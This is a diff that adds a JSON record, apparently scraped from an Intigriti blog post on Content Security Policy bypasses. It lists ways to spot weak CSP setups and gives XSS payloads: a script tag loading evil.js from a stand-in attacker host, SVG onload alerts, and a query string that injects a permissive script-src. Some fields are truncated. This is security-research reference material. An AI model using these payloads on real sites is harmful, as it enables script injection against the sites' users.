@@ -1,0 +1,24 @@
+{
+  "platform": "intigriti",
+  "vuln": "xss",
+  "url": "https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses",
+  "title": "CSP Bypasses: Advanced Exploitation Guide",
+  "discovered_at": "2026-04-24T13:35:20.727902+00:00",
+  "how_to_find": [
+    "No Content Security Policy (CSP) declaration",
+    "Bypassing CSP enabled in reporting mode only",
+    "Bypassing CSP via non-restrictive declarations"
+  ],
+  "payloads_or_poc": [
+    "*) has been set as the declaration source, no restrictions will be applied, and a simple payload that loads an external script will be allowed to execute:",
+    "<script src=//attacker-host/evil.js></script>",
+    "'\"><svg onload=alert(/INTIGRITI/)>",
+    "script-src restricts script execution to the same origin and two popular CDNs. However, both of these whitelisted CDNs host vulnerable versions of JavaScript libraries that can be exploited to execute arbitrary code. Wit…",
+    "As you may have already figured out, the CSP nonce is calculated based on a universal timestamp and the client's user-agent, both of which are predictable by the attacker. Although a new nonce is issued only after 60 sec…",
+    "/?csp_report_uri=/report; script-src * 'unsafe-inline';&vulnerable=<script>alert()</script>"
+  ],
+  "source": {
+    "fetched_at": "2026-04-24T13:35:20.727918+00:00",
+    "http_status": 200
+  }
+}
